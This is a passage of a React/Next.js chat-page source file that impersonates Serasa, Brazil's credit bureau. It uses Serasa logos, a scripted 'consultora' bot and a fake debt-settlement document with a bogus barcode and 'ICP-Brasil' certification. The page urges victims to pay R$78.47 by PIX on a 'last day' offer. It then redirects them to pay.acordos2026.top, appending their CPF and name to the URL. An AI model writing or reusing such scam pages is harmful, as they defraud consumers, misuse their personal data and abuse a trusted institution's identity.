                acordoId: "83N2L618362E",
                nome: userData?.nome || "Cliente",
                cpf: userData?.cpf || "",
                valor: "78,47",
              },
            }
            addMessageWithTyping(paymentGenerated, 2000)

            setTimeout(() => {
              const paymentButton: Message = {
                id: "payment-button",
                type: "text",
                content: "Clique no botão a seguir para acessar a página de pagamento seguro:",
                sender: "bot",
                timestamp: new Date(),
                buttons: [
                  {
                    text: "IR PARA A PAGINA DE PAGAMENTO",
                    action: "acessar-pagamento",
                  },
                ],
              }
              addMessageWithTyping(paymentButton, 2000)
            }, 4000)
          }, 4000)
        }, 4000)
      }, 4000)
    }, 4000)
  }

  const redirectToPayment = () => {
    try {
      const checkoutUrl = new URL("https://pay.acordos2026.top/ODAK3LXnLeo3E6V")

      // Preserve current URL tracking params (UTMs, sck, etc)
      if (typeof window !== "undefined") {
        const currentParams = new URLSearchParams(window.location.search)
        currentParams.forEach((v, k) => {
          if (v) checkoutUrl.searchParams.set(k, v)
        })
      }

      if (userData?.cpf) {
        const rawCpf = userData.cpf.replace(/\D/g, "")
        checkoutUrl.searchParams.set("cpf", rawCpf)
      }
      if (userData?.nome) {
        checkoutUrl.searchParams.set("nome", userData.nome)
        checkoutUrl.searchParams.set("name", userData.nome)
      }

      window.location.href = checkoutUrl.toString()
    } catch {
      window.location.href = "https://pay.acordos2026.top/ODAK3LXnLeo3E6V"
    }
  }

  if (!cpf) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-pink-50 to-pink-100 flex items-center justify-center">
        <Card className="p-8 text-center bg-white shadow-xl border-0">
          <div className="w-16 h-16 bg-pink-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <Image
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/unnamed-mc1cq9oGl94BkoUSXsitt93EG7m1IA.png"
              alt="Serasa"
              width={48}
              height={48}
              className="w-12 h-12 rounded-full"
            />
          </div>
          <h1 className="text-xl font-semibold text-gray-800 mb-4">CPF nao encontrado</h1>
          <p className="text-gray-600">Por favor, volte e insira seu CPF novamente.</p>
        </Card>
      </div>
    )
  }

  return (
    <div className="fixed inset-0 h-[100dvh] flex flex-col bg-gradient-to-br from-pink-50 to-white overflow-hidden">
      {/* Header Fixo no Topo */}
      <header className="flex-shrink-0 z-50 bg-pink-600 text-white px-4 pt-[max(0.75rem,env(safe-area-inset-top))] pb-3 sm:py-4 shadow-md select-none">
        <div className="max-w-4xl mx-auto flex items-center gap-3">
          <Image
            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823-yjRNE2BWqVov1rmSNnnOJxZGzE72xl.png"
            alt="Serasa"
            width={120}
            height={40}
            className="h-7 sm:h-8 w-auto object-contain"
            priority
          />
          <div className="flex-1 min-w-0">
            <h1 className="font-semibold text-base sm:text-lg leading-tight truncate">Atendimento Serasa</h1>
            <p className="text-xs sm:text-sm opacity-90 flex items-center gap-1.5 leading-tight truncate">
              <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse flex-shrink-0"></span>
              Renata - Consultora Online
            </p>
          </div>
          <div className="flex items-center gap-2 flex-shrink-0">
            <div className="text-right hidden sm:block">
              <p className="text-xs opacity-75">Feirao Limpa Nome</p>
              <p className="text-xs font-semibold">Ultimo dia!</p>
            </div>
            <div className="w-9 h-9 sm:w-10 sm:h-10 bg-white/20 rounded-full flex items-center justify-center overflow-hidden">
              <Image
                src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/unnamed-mc1cq9oGl94BkoUSXsitt93EG7m1IA.png"
                alt="Atendente"
                width={36}
                height={36}
                className="w-8 h-8 sm:w-9 sm:h-9 rounded-full object-cover"
              />
            </div>
          </div>
        </div>
      </header>

      {/* Area Rolavel de Mensagens com scroll nativo e suave */}
      <main
        ref={chatContainerRef}
        className="flex-1 overflow-y-auto overflow-x-hidden relative overscroll-y-contain"
        style={{
          WebkitOverflowScrolling: "touch",
          scrollBehavior: "smooth",
        }}
      >
        <div className="max-w-4xl mx-auto bg-white/80 backdrop-blur-sm min-h-full relative shadow-xl">
          <div className="p-3.5 sm:p-4 space-y-4 pb-[max(5rem,calc(env(safe-area-inset-bottom)+4rem))]">
          {isLoading && (
            <div className="flex justify-center py-8">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-pink-600"></div>
            </div>
          )}

          {messages.map((message, index) => (
            <div key={`${message.id}-${index}`}>
              <div className={`flex ${message.sender === "bot" ? "justify-start" : "justify-end"}`}>
                <div className={message.sender === "bot" ? "w-full max-w-[340px] sm:max-w-[380px] lg:max-w-md" : "max-w-[85%] sm:max-w-md"}>
                  <div
                    className={`flex items-start gap-2 mb-2 ${message.sender === "bot" ? "flex-row" : "flex-row-reverse"}`}
                  >
                    <div
                      className={`w-8 h-8 ${message.sender === "bot" ? "bg-pink-600" : "bg-blue-500"} rounded-full flex items-center justify-center text-white text-sm font-semibold flex-shrink-0`}
                    >
                      {message.sender === "bot" ? (
                        <Image
                          src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/unnamed-mc1cq9oGl94BkoUSXsitt93EG7m1IA.png"
                          alt="Serasa"
                          width={32}
                          height={32}
                          className="w-8 h-8 rounded-full"
                        />
                      ) : (
                        userData?.nome?.charAt(0).toUpperCase() || "U"
                      )}
                    </div>
                    <div className={message.sender === "bot" ? "flex-1 min-w-0 flex flex-col items-start" : "flex flex-col items-end"}>
                      <div
                        className={`${
                          message.type === "agreement-document" || message.type === "score-gauge" || message.type === "payment-guide"
                            ? "bg-transparent border-0 p-0 shadow-none w-full"
                            : message.type === "data-confirmation"
                            ? "w-full"
                            : message.sender === "bot"
                            ? "w-fit max-w-full bg-gray-100 border-gray-200 shadow-sm rounded-2xl rounded-tl-xs px-4 py-2.5 border text-gray-800"
                            : "w-fit bg-pink-600 text-white shadow-sm rounded-2xl rounded-tr-xs px-4 py-2.5 border-0 font-medium"
                        }`}
                      >
                        {message.type === "image" && message.imageUrl && (
                          <div className="mb-2">
                            <Image
                              src={message.imageUrl || "/placeholder.svg"}
                              alt=""
                              width={300}
                              height={200}
                              className="rounded-lg w-full"
                              onLoad={() => scrollToBottom("smooth")}
                            />
                          </div>
                        )}

                        {message.type === "score-gauge" && (
                          <div className="my-1">
                            <AnimatedScoreGauge targetScore={message.data?.targetScore || 129} />
                          </div>
                        )}

                        {message.type === "audio" && message.audioUrl && (
                          <div className="mb-1">
                            <ModernAudioPlayer audioUrl={message.audioUrl} messageId={message.id} />
                          </div>
                        )}

                        {message.type === "video" && message.videoUrl && (
                          <div className="mb-2">
                            <iframe
                              src={`${message.videoUrl}&autoplay=1`}
                              width="300"
                              height="200"
                              frameBorder="0"
                              allow="autoplay; fullscreen; picture-in-picture"
                              className="rounded-lg w-full"
                            ></iframe>
                          </div>
                        )}

                        {message.type === "embed" && message.embedUrl && (
                          <div className="mb-2">
                            <iframe
                              src={message.embedUrl}
                              width="300"
                              height="400"
                              frameBorder="0"
                              className="rounded-lg w-full border"
                              title="Carta de Quitação"
                            ></iframe>
                          </div>
                        )}

                        {message.type === "agreement-document" && message.data ? (
                          <div className="w-full max-w-[340px] sm:max-w-[380px] my-1 select-none font-sans">
                            <div className="bg-white border border-slate-300 rounded-xl shadow-md overflow-hidden text-xs text-slate-800">
                              {/* Faixa magenta oficial Serasa */}
                              <div className="h-1 bg-[#e6007e]"></div>

                              {/* Cabeçalho Compacto do Documento */}
                              <div className="px-3.5 py-2.5 bg-slate-50 border-b border-slate-200">
                                <div className="flex items-center justify-between">
                                  <div className="flex items-center">
                                    <Image
                                      src="/serasa-limpa-nome-color.svg"
                                      alt="Serasa Limpa Nome"
                                      width={125}
                                      height={30}
                                      className="h-5 w-auto object-contain"
                                    />
                                  </div>
                                  <span className="text-[9px] font-semibold text-slate-600 bg-slate-200/80 px-2 py-0.5 rounded">
                                    VIA DO TITULAR
                                  </span>
                                </div>
                                <div className="mt-1.5 flex items-center justify-between text-[11px] pt-1.5 border-t border-slate-200/60">
                                  <span className="font-bold text-slate-900 uppercase text-[10px]">
                                    Termo de Quitação Extrajudicial
                                  </span>
                                  <span className="text-[10px] font-mono font-bold text-slate-600">
                                    Nº {message.data.acordoId || "83N2L618362E"}
                                  </span>
                                </div>
                              </div>

                              {/* Dados do Titular em Linha Dupla Compacta */}
                              <div className="px-3.5 py-2 bg-white border-b border-slate-100 flex items-center justify-between">
                                <div className="min-w-0 pr-2">
                                  <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">
                                    Titular Beneficiário(a)
                                  </span>
                                  <span className="font-bold text-slate-900 text-xs block truncate max-w-[190px]">
                                    {message.data.nome || "Cliente"}
                                  </span>
                                </div>
                                <div className="text-right flex-shrink-0">
                                  <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">
                                    CPF
                                  </span>
                                  <span className="font-mono text-xs text-slate-700 font-semibold">
                                    {formatCPF(message.data.cpf)}
                                  </span>
                                </div>
                              </div>

                              {/* Demonstrativo Financeiro Compacto */}
                              <div className="px-3.5 py-2.5 bg-slate-50/50 space-y-1.5 text-xs">
                                <div className="flex justify-between items-center text-slate-600">
                                  <span>Dívida Total Original:</span>
                                  <span className="line-through text-slate-400 font-mono font-medium">
                                    R$ {message.data.valorDivida || "7.566,52"}
                                  </span>
                                </div>
                                <div className="flex justify-between items-center text-slate-600">
                                  <span className="text-emerald-700 font-medium">Desconto Feirão (98,7%):</span>
                                  <span className="font-bold text-emerald-700 font-mono">
                                    - R$ {message.data.valorDesconto || "7.488,05"}
                                  </span>
                                </div>
                                <div className="flex justify-between items-center text-slate-600">
                                  <span>Juros e Encargos:</span>
                                  <span className="font-semibold text-slate-700">100% Isentos</span>
                                </div>

                                {/* Box do Valor Final a Pagar Compacto */}
                                <div className="bg-[#f0fdf4] border border-[#86efac] rounded-lg p-2.5 my-1.5">
                                  <div className="flex justify-between items-center">
                                    <div>
                                      <span className="text-[9px] text-emerald-800 font-bold uppercase block tracking-wider">
                                        Total a Pagar (Único)
                                      </span>
                                      <span className="text-xl font-black text-[#15803d] font-mono leading-tight">
                                        R$ {message.data.valorContrato || "78,47"}
                                      </span>
                                    </div>
                                    <div className="text-right">
                                      <span className="bg-emerald-100 text-emerald-800 px-1.5 py-0.5 rounded text-[9px] font-bold inline-block mb-0.5">
                                        PIX À VISTA
                                      </span>
                                      <span className="text-[10px] text-slate-600 block font-mono">
                                        Venc: {message.data.vencimento || new Date().toLocaleDateString("pt-BR")}
                                      </span>
                                    </div>
                                  </div>
                                </div>
                              </div>

                              {/* Cláusula de Validade e Baixa Legal Curta */}
                              <div className="px-3 py-2 bg-amber-50/80 border-t border-b border-amber-200 text-[10px] text-amber-900 leading-snug">
                                <strong>Aviso:</strong> Válido exclusivamente para a titular. A quitação via PIX gera baixa automática e cancelamento das pendências na Serasa e SPC em até 1 hora útil.
                              </div>

                              {/* Código de barras compacto */}
                              <div className="px-3 py-2 bg-white flex flex-col items-center">
                                <div className="h-5 w-full max-w-[220px] flex items-stretch justify-between px-1 opacity-70">
                                  {[3,1,2,1,4,1,2,3,1,2,4,1,2,1,3,2,1,4,1,2,3,1,2,4,1,2].map((w, idx) => (
                                    <div key={idx} className="bg-slate-900" style={{ width: `${w}px` }} />
                                  ))}
                                </div>
                                <div className="text-[8.5px] font-mono text-slate-700 mt-1 font-semibold">
                                  83N20.61836 2E987.050012 34000.784700 1 98760000007847
                                </div>
                                <div className="text-[7.5px] uppercase tracking-wider text-slate-400 mt-0.5">
                                  Certificação Digital Serasa Experian • ICP-Brasil
                                </div>
                              </div>
                            </div>
                          </div>
                        ) : message.type === "payment-guide" ? (
                          <div className="w-full max-w-[340px] sm:max-w-[380px] my-1 font-sans">
                            <div className="bg-white rounded-2xl border border-pink-100 shadow-md p-4 text-xs overflow-hidden">
                              <div className="h-1 bg-[#e6007e] -mx-4 -mt-4 mb-3"></div>
                              <div className="flex items-center gap-2.5 pb-2.5 border-b border-slate-100">
                                <div className="w-9 h-9 rounded-xl bg-pink-50 border border-pink-200 flex items-center justify-center text-[#e6007e] flex-shrink-0">
                                  <QrCode className="w-5 h-5" />
                                </div>
                                <div>
                                  <h4 className="font-bold text-slate-900 text-sm">A guia de pagamento foi gerada!</h4>
                                  <p className="text-[11px] text-slate-500 font-mono">Acordo nº {message.data?.acordoId || "83N2L618362E"}</p>
                                </div>
                              </div>

                              <div className="py-2.5 space-y-2 text-slate-600">
                                <div className="flex justify-between items-center text-xs">
                                  <span className="text-slate-400 text-[10px] uppercase font-bold tracking-wider">Beneficiário(a):</span>
                                  <span className="font-bold text-slate-800 text-right truncate max-w-[180px]">{message.data?.nome || userData?.nome || "Cliente"}</span>
                                </div>
                                <div className="flex justify-between items-center text-xs">
                                  <span className="text-slate-400 text-[10px] uppercase font-bold tracking-wider">Identificação (CPF):</span>
                                  <span className="font-mono font-semibold text-slate-800">{formatCPF(message.data?.cpf || userData?.cpf || "")}</span>
                                </div>
                                <div className="flex justify-between items-center text-xs">
                                  <span className="text-slate-400 text-[10px] uppercase font-bold tracking-wider">Modalidade:</span>
                                  <span className="font-semibold text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded border border-emerald-200 text-[11px]">PIX Baixa Imediata</span>
                                </div>
                                <div className="flex justify-between items-center text-xs">
                                  <span className="text-slate-400 text-[10px] uppercase font-bold tracking-wider">Status:</span>
                                  <span className="font-semibold text-amber-700 bg-amber-50 px-2 py-0.5 rounded border border-amber-200 text-[11px] flex items-center gap-1">
                                    <Clock className="w-3 h-3" /> Aguardando Liquidação
                                  </span>
                                </div>
                              </div>

                              <div className="pt-2 border-t border-slate-100 text-[11px] text-slate-500 leading-tight">
                                Clique no botão abaixo para ir à página de pagamento seguro e liberar seu comprovante de quitação.
                              </div>
                            </div>
                          </div>
                        ) : message.type === "data-confirmation" ? (
                          <div className="w-full max-w-[340px] sm:max-w-[380px] my-1 font-sans">
                            <p className={`text-sm ${message.sender === "bot" ? "text-gray-800" : "text-white"} mb-3 whitespace-pre-line`}>
                              {message.content}
                            </p>
                            {message.data && (
                              <div className="bg-white rounded-2xl border border-slate-200/90 shadow-md p-4 text-xs">
                                <div className="flex items-center justify-between pb-2.5 mb-2.5 border-b border-slate-100">
                                  <div className="flex items-center gap-2">
                                    <ShieldCheck className="w-4 h-4 text-pink-600" />
                                    <span className="font-bold text-slate-800 text-xs">Dados Cadastrais Confirmados</span>
                                  </div>
                                  <span className="text-[10px] bg-emerald-50 text-emerald-600 font-semibold px-2 py-0.5 rounded-full border border-emerald-200">
                                    Validação RFB
                                  </span>
                                </div>

                                <div className="space-y-2.5">
                                  <div>
                                    <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Nome Completo</span>
                                    <span className="font-bold text-slate-900 text-sm leading-snug">{message.data.nome || "Cliente"}</span>
                                  </div>

                                  <div className="grid grid-cols-2 gap-2">
                                    <div>
                                      <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Identificação (CPF)</span>
                                      <span className="font-mono font-semibold text-slate-800">{formatCPF(message.data.cpf || "")}</span>
                                    </div>
                                    <div>
                                      <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Nascimento</span>
                                      <span className="font-semibold text-slate-800">{message.data.nascimento || "Localizado"}</span>
                                    </div>
                                  </div>

                                  {message.data.mae && (
                                    <div>
                                      <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Nome da Mãe</span>
                                      <span className="font-medium text-slate-700">{message.data.mae}</span>
                                    </div>
                                  )}

                                  <div className="grid grid-cols-2 gap-2">
                                    {message.data.sexo && (
                                      <div>
                                        <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Sexo</span>
                                        <span className="font-medium text-slate-700">{message.data.sexo}</span>
                                      </div>
                                    )}
                                    <div>
                                      <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Região / Atendimento</span>
                                      <span className="font-semibold text-slate-800">{message.data.cidade || "Brasil"}</span>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            )}
                          </div>
                        ) : (
                          <div>
                            <p className={`text-sm ${message.sender === "bot" ? "text-gray-800" : "text-white"} whitespace-pre-line`}>{message.content}</p>
                          </div>
                        )}
                      </div>
                      <p
                        className={`text-xs text-gray-500 mt-1 ${message.sender === "bot" ? "text-left" : "text-right"}`}
                      >
                        {isMounted
                          ? message.timestamp.toLocaleTimeString("pt-BR", {
                              hour: "2-digit",
                              minute: "2-digit",
                            })
                          : ""}
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              {message.buttons && (
                <div className="flex justify-end mt-2 mb-4">
                  <div className="space-y-2 max-w-xs">
                    {message.buttons
                      .filter((button) => {
                        const buttonId = `${button.action}-${button.text}`
                        return !clickedButtons.has(buttonId)
                      })
                      .map((button, index) => (
                        <div
                          key={index}
                          onClick={() => handleButtonClick(button.action, button.text)}
                          className="bg-pink-600 hover:bg-pink-700 text-white rounded-xl px-6 py-4 cursor-pointer shadow-lg hover:shadow-xl transition-all duration-200 text-sm font-semibold border-0"
                        >
                          {button.text}
                        </div>
                      ))}
                    {message.buttons.some((button) => {
                      const buttonId = `${button.action}-${button.text}`
                      return !clickedButtons.has(buttonId)
                    }) && <div className="text-xs text-gray-400 text-right mt-1">Toque para enviar</div>}
                  </div>
                </div>
              )}
            </div>
          ))}

          {isTyping && (
            <div className="flex justify-start mb-2">
              <div className="flex items-end gap-2">
                <div className="w-8 h-8 rounded-full overflow-hidden flex-shrink-0 bg-pink-600">
                  <Image
                    src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/unnamed-mc1cq9oGl94BkoUSXsitt93EG7m1IA.png"
                    alt="Serasa"
                    width={32}
                    height={32}
                    className="w-8 h-8 rounded-full object-cover"
                  />
                </div>
                <div className="bg-gray-100 border border-gray-200/90 rounded-2xl rounded-bl-sm px-3.5 py-2 shadow-sm flex items-center space-x-1.5 h-8">
                  <div className="w-1.5 h-1.5 bg-[#e6007e] rounded-full animate-bounce" style={{ animationDuration: "0.8s" }}></div>
                  <div
                    className="w-1.5 h-1.5 bg-[#e6007e] rounded-full animate-bounce"
                    style={{ animationDuration: "0.8s", animationDelay: "0.15s" }}
                  ></div>
                  <div
                    className="w-1.5 h-1.5 bg-[#e6007e] rounded-full animate-bounce"
                    style={{ animationDuration: "0.8s", animationDelay: "0.3s" }}
                  ></div>
                </div>
              </div>
            </div>
          )}

            <div ref={messagesEndRef} className="h-6 w-full" />
          </div>
        </div>
      </main>
    </div>
  )
}

export default function ChatPage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-gray-50 flex items-center justify-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-pink-600"></div>
        </div>
      }
    >
      <ChatContent />
    </Suspense>
  )
}
